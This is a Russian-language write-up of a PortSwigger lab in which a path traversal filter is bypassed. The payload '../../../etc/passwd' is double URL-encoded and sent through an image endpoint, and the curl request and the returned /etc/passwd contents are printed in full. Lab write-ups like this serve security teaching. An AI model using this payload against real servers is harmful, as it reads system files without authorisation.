---
title: "File path traversal, traversal sequences stripped with superfluous URL-decode"
date: 2025-07-03
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/path-traversal/common-obstacles-to-exploiting-path-traversal-vulnerabilities/file-path-traversal/lab-superfluous-url-decode"
classes: wide
---

Эта лабораторная работа содержит уязвимость **Path Traversal** при отображении изображений продуктов.

Приложение блокирует передаваемые параметры со специальными символами. Перед обработкой происходит декодирование `URL` значений.

Необходимо вывести содержимое файла `/etc/passwd`.

```
https://0a870035033fc1ba80e0713b009800d3.web-security-academy.net
```

## Solution

Из задания понятно, что нужно смотреть загрузку фотографий, поэтому сразу беру нужный запрос:

![IMG](/assets/images/PortSwigger/IMG_path_traversal/IMG_traversal_sequences_stripped_with_superfluous_URL-decode/1.png){: height="200" .align-center}

```
https://0a870035033fc1ba80e0713b009800d3.web-security-academy.net/image?filename=58.jpg
```

Сервер фильтрует специальные символы в запросе. Перед проверкой он декодирует `URL` кодировку. Почему бы тогда не закодировать пейлоад дважды?) Для этого удобно использовать [Cyberchef](https://gchq.github.io/CyberChef/#recipe=URL_Decode(/disabled)URL_Encode(true)URL_Encode(false/breakpoint)&input=Li4vLi4vLi4vZXRjL3Bhc3N3ZA):

![IMG](/assets/images/PortSwigger/IMG_path_traversal/IMG_traversal_sequences_stripped_with_superfluous_URL-decode/2.png){: height="200" .align-center}

Я получил следующий пейлоад:

```
%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```

Передам его в качестве значения в `GET`-запросе:

```
https://0a870035033fc1ba80e0713b009800d3.web-security-academy.net/image?filename=%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```

Я получил ошибку:

```
The image 'https://0a870035033fc1ba80e0713b009800d3.web-security-academy.net/image?filename=%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd' cannot be displayed because it contains errors.
```

Содержимое можно получить с помощью `curl`:

```bash
cu63:~/ $ curl https://0a870035033fc1ba80e0713b009800d3.web-security-academy.net/image\?filename\=%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd                                                  
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
```

Лаба решена.
